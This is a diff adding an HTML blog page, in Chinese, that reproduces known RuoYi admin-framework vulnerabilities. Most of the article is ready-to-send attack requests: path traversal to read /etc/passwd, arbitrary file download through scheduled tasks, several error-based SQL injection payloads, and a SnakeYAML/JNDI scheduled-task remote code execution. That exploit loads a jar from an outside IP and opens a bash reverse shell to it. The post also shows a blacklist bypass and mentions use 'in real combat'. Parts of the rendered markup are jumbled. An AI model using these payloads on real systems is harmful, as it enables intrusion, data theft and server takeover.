@@ -1,0 +1,733 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="lolydawn">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="若依历史漏洞复现shiro shiro1.24存在默认秘钥 或者任意文件读取配合 去读取配置文件(1.24之后秘钥写在配置文件中)  任意文件读取一影响版本：RuoYi&lt;4.5.1 &#x2F;common&#x2F;download&#x2F;resource?resource&#x3D;&#x2F;profile&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd 123456789101112131415161718192">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ruoyi历史漏洞复现">
+<meta property="og:url" content="https://lolydawn.github.io/2024/08/12/ruoyi%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="lolydawn">
+<meta property="og:description" content="若依历史漏洞复现shiro shiro1.24存在默认秘钥 或者任意文件读取配合 去读取配置文件(1.24之后秘钥写在配置文件中)  任意文件读取一影响版本：RuoYi&lt;4.5.1 &#x2F;common&#x2F;download&#x2F;resource?resource&#x3D;&#x2F;profile&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd 123456789101112131415161718192">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2024-08-12T11:09:54.000Z">
+<meta property="article:modified_time" content="2025-08-22T06:16:02.679Z">
+<meta property="article:author" content="lolydawn">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>ruoyi历史漏洞复现 - lolydawn</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"lolydawn.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>lolydawn</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="ruoyi历史漏洞复现"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-08-12 19:09" pubdate>
+          August 12, 2024 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.4k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          12 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">ruoyi历史漏洞复现</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="若依历史漏洞复现"><a href="#若依历史漏洞复现" class="headerlink" title="若依历史漏洞复现"></a>若依历史漏洞复现</h1><h2 id="shiro"><a href="#shiro" class="headerlink" title="shiro"></a>shiro</h2><ul>
+<li>shiro1.24存在默认秘钥</li>
+<li>或者任意文件读取配合 去读取配置文件(1.24之后秘钥写在配置文件中)</li>
+</ul>
+<h2 id="任意文件读取一"><a href="#任意文件读取一" class="headerlink" title="任意文件读取一"></a>任意文件读取一</h2><h3 id="影响版本：RuoYi"><a href="#影响版本：RuoYi" class="headerlink" title="影响版本：RuoYi&lt;4.5.1"></a>影响版本：RuoYi&lt;4.5.1</h3><ul>
+<li><pre><code class="hljs">/common/download/resource?resource=/profile/../../../../../../../etc/passwd
+<figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><br><span class="hljs-comment">## 任意文件读取二</span><br><br><span class="hljs-comment">### 影响版本：RuoYi&lt;4.7.6 </span><br><br><span class="hljs-bullet">-</span> <span class="hljs-string">首先创建一个定时任务</span><br><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">```</span><br>    <span class="hljs-attribute">POST /monitor/job/add HTTP/1.1</span><br><span class="hljs-attribute">    Host</span><span class="hljs-punctuation">:</span> <span class="hljs-string">127.0.0.1</span><br>    <span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">:</span> <span class="hljs-string">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0</span><br>    <span class="hljs-attribute">Accept</span><span class="hljs-punctuation">:</span> <span class="hljs-string">application/json, text/javascript, */*; q=0.01</span><br>    <span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">:</span> <span class="hljs-string">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br>    <span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">:</span> <span class="hljs-string">gzip, deflate</span><br>    <span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">:</span> <span class="hljs-string">application/x-www-form-urlencoded; charset=UTF-8</span><br>    <span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">:</span> <span class="hljs-string">XMLHttpRequest</span><br>    <span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">:</span> <span class="hljs-string">184</span><br>    <span class="hljs-attribute">Origin</span><span class="hljs-punctuation">:</span> <span class="hljs-string">http://127.0.0.1</span><br>    <span class="hljs-attribute">Connection</span><span class="hljs-punctuation">:</span> <span class="hljs-string">close</span><br>    <span class="hljs-attribute">Referer</span><span class="hljs-punctuation">:</span> <span class="hljs-string">http://127.0.0.1/monitor/job/add</span><br>    <span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">:</span> <span class="hljs-string">JSESSIONID=07ec5ec3-ceee-42bc-996a-32dc8f5bb7d0</span><br>    <span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">:</span> <span class="hljs-string">empty</span><br>    <span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">:</span> <span class="hljs-string">cors</span><br>    <span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">:</span> <span class="hljs-string">same-origin</span><br>    <br>    createBy=admin&amp;jobName=aaaaa&amp;jobGroup=DEFAULT&amp;invokeTarget=ruoYiConfig.setProfile(&#x27;c%3A%5C%5Cquartz.sql&#x27;)&amp;cronExpression=0+0+2+1%2F1+*+%3F&amp;misfirePolicy=1&amp;concurrent=1&amp;status=0&amp;remark=<br></code></pre></td></tr></table></figure>
+
+- 这个包最好先在本地构建一遍，然后再修改关键参数 否则容易操作失败
+
+- 如果能图形化操作最好图形化操作
+
+- 执行一遍这个任务
+
+- ```
+  POST /monitor/job/run HTTP/1.1
+  Host: 127.0.0.1
+  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
+  Accept: application/json, text/javascript, */*; q=0.01
+  Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+  Accept-Encoding: gzip, deflate
+  Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+  X-Requested-With: XMLHttpRequest
+  Content-Length: 9
+  Origin: http://127.0.0.1
+  Connection: close
+  Referer: http://127.0.0.1/monitor/job
+  Cookie: JSESSIONID=07ec5ec3-ceee-42bc-996a-32dc8f5bb7d0
+  Sec-Fetch-Dest: empty
+  Sec-Fetch-Mode: cors
+  Sec-Fetch-Site: same-origin
+  
+  jobId=108
+  <figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><br><span class="hljs-bullet">- </span>最后即可通过下载任意文件 获取前面构造的文件内容<br><br></code></pre></td></tr></table></figure>
+  GET /common/download/resource?resource=2.txt
+  <figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><br><span class="hljs-comment">## sql注入一</span><br><br><span class="hljs-comment">### 影响版本：RuoYi&lt; 4.6.2</span><br><br><span class="hljs-bullet">-</span> <span class="hljs-string">```</span><br>  <span class="hljs-attribute">POST /system/role/list HTTP/1.1</span><br><span class="hljs-attribute">  Host</span><span class="hljs-punctuation">:</span> <span class="hljs-string">127.0.0.1</span><br>  <span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">:</span> <span class="hljs-string">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0</span><br>  <span class="hljs-attribute">Accept</span><span class="hljs-punctuation">:</span> <span class="hljs-string">application/json, text/javascript, */*; q=0.01</span><br>  <span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">:</span> <span class="hljs-string">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br>  <span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">:</span> <span class="hljs-string">gzip, deflate</span><br>  <span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">:</span> <span class="hljs-string">application/x-www-form-urlencoded</span><br>  <span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">:</span> <span class="hljs-string">XMLHttpRequest</span><br>  <span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">:</span> <span class="hljs-string">178</span><br>  <span class="hljs-attribute">Origin</span><span class="hljs-punctuation">:</span> <span class="hljs-string">http://127.0.0.1</span><br>  <span class="hljs-attribute">Connection</span><span class="hljs-punctuation">:</span> <span class="hljs-string">close</span><br>  <span class="hljs-attribute">Referer</span><span class="hljs-punctuation">:</span> <span class="hljs-string">http://127.0.0.1/system/user</span><br>  <span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">:</span> <span class="hljs-string">JSESSIONID=07ec5ec3-ceee-42bc-996a-32dc8f5bb7d0</span><br>  <span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">:</span> <span class="hljs-string">empty</span><br>  <span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">:</span> <span class="hljs-string">cors</span><br>  <span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">:</span> <span class="hljs-string">same-origin</span><br>  <br>  pageSize=&amp;pageNum=&amp;orderByColumn=&amp;isAsc=&amp;roleName=&amp;roleKey=&amp;status=&amp;params[beginTime]=&amp;params[endTime]=&amp;params[dataScope]=and extractvalue(1,concat(0x7e,(select version()),0x7e))<br></code></pre></td></tr></table></figure>
+
+- 看回显是否有想要的信息即可判断
+
+- ```
+  POST /system/dept/edit HTTP/1.1
+  Host: 127.0.0.1
+  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
+  Accept: application/json, text/javascript, */*; q=0.01
+  Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+  Accept-Encoding: gzip, deflate
+  Content-Type: application/x-www-form-urlencoded
+  X-Requested-With: XMLHttpRequest
+  Content-Length: 111
+  Origin: http://127.0.0.1
+  Connection: close
+  Referer: http://127.0.0.1/system/user
+  Cookie: JSESSIONID=07ec5ec3-ceee-42bc-996a-32dc8f5bb7d0
+  Sec-Fetch-Dest: empty
+  Sec-Fetch-Mode: cors
+  Sec-Fetch-Site: same-origin
+  
+  DeptName=1&amp;DeptId=100&amp;ParentId=12&amp;Status=0&amp;OrderNum=1&amp;ancestors=0)or(extractvalue(1,concat((select user()))));#
+  <figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><br><span class="hljs-bullet">-</span> <span class="hljs-string">回显的是user()内容 一般是localhost</span><br><br><span class="hljs-bullet">-</span> <span class="hljs-string">```</span><br>  <span class="hljs-attribute">POST /system/role/export HTTP/1.1</span><br><span class="hljs-attribute">  Host</span><span class="hljs-punctuation">:</span> <span class="hljs-string">127.0.0.1</span><br>  <span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">:</span> <span class="hljs-string">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0</span><br>  <span class="hljs-attribute">Accept</span><span class="hljs-punctuation">:</span> <span class="hljs-string">application/json, text/javascript, */*; q=0.01</span><br>  <span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">:</span> <span class="hljs-string">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br>  <span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">:</span> <span class="hljs-string">gzip, deflate</span><br>  <span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">:</span> <span class="hljs-string">application/x-www-form-urlencoded</span><br>  <span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">:</span> <span class="hljs-string">XMLHttpRequest</span><br>  <span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">:</span> <span class="hljs-string">75</span><br>  <span class="hljs-attribute">Origin</span><span class="hljs-punctuation">:</span> <span class="hljs-string">http://127.0.0.1</span><br>  <span class="hljs-attribute">Connection</span><span class="hljs-punctuation">:</span> <span class="hljs-string">close</span><br>  <span class="hljs-attribute">Referer</span><span class="hljs-punctuation">:</span> <span class="hljs-string">http://127.0.0.1/system/user</span><br>  <span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">:</span> <span class="hljs-string">JSESSIONID=07ec5ec3-ceee-42bc-996a-32dc8f5bb7d0</span><br>  <span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">:</span> <span class="hljs-string">empty</span><br>  <span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">:</span> <span class="hljs-string">cors</span><br>  <span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">:</span> <span class="hljs-string">same-origin</span><br>  <br>  params[dataScope]=and extractvalue(1,concat(0x7e,(select database()),0x7e))<br></code></pre></td></tr></table></figure>
+
+## sql注入二（4.7.0&lt;x&lt;4.7.5）
+
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/tool/gen/createTable</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">user-agent</span><span class="hljs-punctuation">: </span>Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;SV1)<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>JSESSIONID=62627303-0fd9-45d8-be63-2fbcb8de6594<br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span><br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>57<br><br><span class="language-pgsql"><span class="hljs-keyword">sql</span>=<span class="hljs-keyword">create</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">table</span><span class="hljs-comment">/**/</span>test<span class="hljs-comment">/**/</span><span class="hljs-keyword">as</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">database</span></span><br></code></pre></td></tr></table></figure>
+</code></pre>
+</li>
+</ul>
+<h2 id="后台计划任务（RuoYi"><a href="#后台计划任务（RuoYi" class="headerlink" title="后台计划任务（RuoYi&lt;4.6.2）"></a>后台计划任务（RuoYi&lt;4.6.2）</h2><ul>
+<li><p>org.springframework.jndi.JndiLocatorDelegate.lookup(‘rmi:&#x2F;&#x2F;127.0.0.1:1099&#x2F;refObj’)javax.naming.InitialContext.lookup(‘ldap:&#x2F;&#x2F;:&#x2F;#Exploit’)两个poc选其一即可</p>
+</li>
+<li><p>git clone <a target="_blank" rel="noopener" href="https://github.com/artsploit/yaml-payload">https://github.com/artsploit/yaml-payload</a></p>
+</li>
+</ul>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">Runtime</span>.getRuntime().exec(<span class="hljs-keyword">new</span> String[]&#123;<span class="hljs-string">&quot;/bin/bash&quot;</span>,<span class="hljs-string">&quot;-c&quot;</span>,<span class="hljs-string">&quot;bash -i &gt;&amp; /dev/tcp/47.236.228.126/3333 0&gt;&amp;1&quot;</span>&#125;);<br><br>这上面这一句放到src目录里那个java文件中 另外两个<span class="hljs-keyword">Runtime</span>的注释掉<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><pre><code class="hljs">javac AwesomeScriptEngineFactory.java
+<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><br>- ```<br>  jar -cvf yaml-payload.jar -C src/ .<br></code></pre></td></tr></table></figure>
+</code></pre>
+</li>
+<li><p>此时会生成一个jar包</p>
+</li>
+<li><p>vps开个下载</p>
+</li>
+<li><p>若依创建定时任务</p>
+</li>
+</ul>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs llvm"># 调用目标字符串<br>org.yaml.snakeyaml.Yaml.<span class="hljs-keyword">load</span>(&#x27;!<span class="hljs-title">!javax.script.ScriptEngineManager</span> [<br>  !<span class="hljs-title">!java.net.URLClassLoader</span> [[<br>    !<span class="hljs-title">!java.net.URL</span> [<span class="hljs-string">&quot;http://47.236.228.126:3334/yaml-payload.jar&quot;</span>]<br>  ]]<br>]&#x27;)<br><br># cron 表达式<br><span class="hljs-number">0</span>/<span class="hljs-number">10</span> * * * * ?<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/SZv32Wk6aiPJGGmfrFoU7w">https://mp.weixin.qq.com/s/SZv32Wk6aiPJGGmfrFoU7w</a></li>
+<li>反弹shell 可能挂网站 可以打内存马</li>
+<li>实战的时候要注意看对方是啥系统 上面的payload只有linux适用</li>
+</ul>
+<h2 id="版本4-6-2"><a href="#版本4-6-2" class="headerlink" title="版本4.6.2&lt;&#x3D;Ruoyi&lt;4.7.2"></a>版本4.6.2&lt;&#x3D;Ruoyi&lt;4.7.2</h2><ul>
+<li>采用黑名单做了限制</li>
+<li>定时任务屏蔽ldap远程调用</li>
+<li>定时任务屏蔽http(s)远程调用</li>
+<li>定时任务屏蔽rmi远程调用</li>
+<li>org.yaml.snakeyaml.Yaml.load(‘!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [“h’t’t’p’:&#x2F;&#x2F;127.0.0.1:88&#x2F;yaml-payload.jar”]]]]’)</li>
+<li>加引号即可绕过</li>
+</ul>
+<h2 id="后台任意文件下载"><a href="#后台任意文件下载" class="headerlink" title="后台任意文件下载(&lt;&#x3D;4.7.6)"></a>后台任意文件下载(&lt;&#x3D;4.7.6)</h2><ul>
+<li><p>POST &#x2F;monitor&#x2F;job&#x2F;add HTTP&#x2F;1.1<br>Host: 127.0.0.1<br>User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.15; rv:107.0) Gecko&#x2F;20100101 Firefox&#x2F;107.0<br>Accept: application&#x2F;json, text&#x2F;javascript, <em>&#x2F;</em>; q&#x3D;0.01<br>Accept-Language: en-CA,en-US;q&#x3D;0.7,en;q&#x3D;0.3<br>Accept-Encoding: gzip, deflate<br>Content-Type: application&#x2F;x-www-form-urlencoded; charset&#x3D;UTF-8<br>X-Requested-With: XMLHttpRequest<br>Content-Length: 188<br>Connection: close<br>Cookie: o0At_2132_saltkey&#x3D;JW6Gt2hb; o0At_2132_lastvisit&#x3D;1691240426; o0At_2132_ulastactivity&#x3D;2db4EUfD9WS50eLvnip%2B9TxK2ZhcO65vPL0dA6sPVF8AQSBMa6Qn; JSESSIONID&#x3D;61e79ae9-8cdd-4e51-baac-d269ef551df3</p>
+<p>createBy&#x3D;admin&amp;jobName&#x3D;renwu&amp;jobGroup&#x3D;DEFAULT&amp;invokeTarget&#x3D;ruoYiConfig.setProfile(‘c:&#x2F;&#x2F;windows&#x2F;win.ini’)&amp;cronExpression&#x3D;0%2F15+<em>+</em>+<em>+</em>+%3F&amp;misfirePolicy&#x3D;1&amp;concurrent&#x3D;1&amp;status&#x3D;0&amp;remark&#x3D;</p>
+</li>
+<li><p>先提交一个定时任务(cookie记得替换)</p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="http://127.0.0.1/common/download/resource?resource=c://windows/win.ini:.zip">http://127.0.0.1/common/download/resource?resource=c://windows/win.ini:.zip</a></p>
+</li>
+<li><p>然后下载即可</p>
+</li>
+</ul>
+<h2 id="thymeleaf-模板注入（4-6-0）"><a href="#thymeleaf-模板注入（4-6-0）" class="headerlink" title="thymeleaf 模板注入（4.6.0）"></a>thymeleaf 模板注入（4.6.0）</h2><ul>
+<li><a target="_blank" rel="noopener" href="http://127.0.0.1/common/download/resource?resource=c://windows/win.ini:.zip">http://127.0.0.1/common/download/resource?resource=c://windows/win.ini:.zip</a></li>
+</ul>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>ruoyi历史漏洞复现</div>
+      <div>https://lolydawn.github.io/2024/08/12/ruoyi历史漏洞复现/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>lolydawn</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>August 12, 2024</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
